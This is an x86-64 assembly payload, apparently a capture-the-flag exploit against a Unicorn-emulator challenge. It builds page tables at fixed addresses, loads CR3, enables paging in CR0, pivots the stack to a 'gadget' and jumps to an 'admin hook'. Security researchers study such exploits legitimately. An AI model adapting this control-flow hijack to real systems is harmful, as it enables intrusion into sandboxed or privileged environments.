/* Our PT location */
/* rdi - stack & PT, rsi - code */
movq $0xbabecafe000, %rdi
movq $0xdeadbef0000, %rsi

/* rcx - stack & PT ^ 7, rdx - code ^ 7 */
movq %rdi, %rcx
or $3, %rcx
movq %rsi, %rdx
or $3, %rdx

/* Code pages */
movq %rcx, 0xd8(%rdi)
movq %rcx, 0xd58(%rdi)
movq %rcx, 0x6f8(%rdi)

movq %rdx, 0x778(%rdi)
movq %rdx, 0x800(%rdi)
movq %rdx, %rax
add $0x1000, %rax
movq %rax, 0x788(%rdi)

/* Stack page */
movq %rcx, 0xb8(%rdi)
movq %rcx, 0x578(%rdi)
movq %rcx, 0xb28(%rdi)

movq %rcx, 0x7f0(%rdi)

/* Load the page directory register */
movq %rdi, %cr3

/* Then set PG; in 64-bit mode, PAE must be set to enable PG */
/* https://github.com/unicorn-engine/unicorn/blob/f1f59bac5542776fe85fb225a88d5cc623f89b87/qemu/target-i386/helper.c#L420 */
mov %cr0, %rax
or $0x80000001, %eax
mov %rax, %cr0

/* index 10 gadget, push 0x6b206e61 */
movq $0xbabecafe22f, %rsp

/* Jump to the admin hook */
movq $0xdeadbeef066, %rax
jmp *%rax

/* marker */
nop
nop
nop
nop
nop
